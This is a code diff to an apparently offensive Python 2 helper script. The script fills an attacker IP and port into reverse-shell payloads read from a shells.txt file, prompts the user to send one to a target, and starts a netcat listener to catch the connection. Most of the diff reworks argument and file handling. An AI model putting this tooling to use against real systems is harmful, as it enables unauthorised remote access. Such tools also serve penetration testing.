@@ -2,12 +2,48 @@
 
 import re,os,sys
 from clint.textui import colored
+from pathlib2 import Path
 
-if len(sys.argv) < 3:
-	print 'Syntax Error:\npython %s ip port\nExample:\npython %s 192.168.10.1 4444' %(sys.argv[0],sys.argv[0])
-	sys.exit(-1)
+def help():
+    global ipaddr, port
 
-ipaddr,port = sys.argv[1],sys.argv[2]
+    print 'Syntax Error:\n\tpython %s [ip] [port]\n\nExamples:\n\tpython %s 192.168.1.10 4444\n\tpython %s 4444\n\tpython %s 192.168.1.10\n\n[ip|port] optional when %s contains an data' %(sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0], os.path.join(os.path.dirname(os.path.realpath(__file__)),'my_[ip|port].txt'))
+    sys.exit(-1)
+
+ip_file = os.path.join(os.path.dirname(os.path.realpath(__file__)),'my_ip.txt')
+port_file = os.path.join(os.path.dirname(os.path.realpath(__file__)),'my_port.txt')
+
+ipaddr = ''
+port = ''
+
+if Path(ip_file).is_file():
+    with open(ip_file, 'r') as f:
+        ipaddr = f.read().replace('\n', '')
+
+if Path(port_file).is_file():
+    with open(port_file, 'r') as f:
+        port = f.read().replace('\n', '')
+
+# in python, the script name is the first arg
+num_args = 1
+
+if len(ipaddr) == 0:
+    num_args += 1
+
+if len(port) == 0:
+    num_args += 1
+
+if len(sys.argv) == 2:
+    if '.' in sys.argv[1]:
+        ipaddr = sys.argv[1]
+    else:
+        port = sys.argv[1]
+elif len(sys.argv) == 3:
+    ipaddr,port = sys.argv[1],sys.argv[2]
+
+if len(sys.argv) < num_args:
+    help()
+
 shells = os.path.join(os.path.dirname(os.path.realpath(__file__)),'shells.txt')
 for shell in open(shells):
 	desc,cmd = shell.split('|',1)
@@ -18,5 +54,4 @@ for shell in open(shells):
 
 raw_input('Select your payload, press any key to start the nc listener and send it to the target...')
 
-#os.system('nc -vv -l %s %s' % (ipaddr, port))
 os.system('nc -vvln -s %s -p %s' % (ipaddr, port)) #Changed nc command flags to work with Kali Rolling
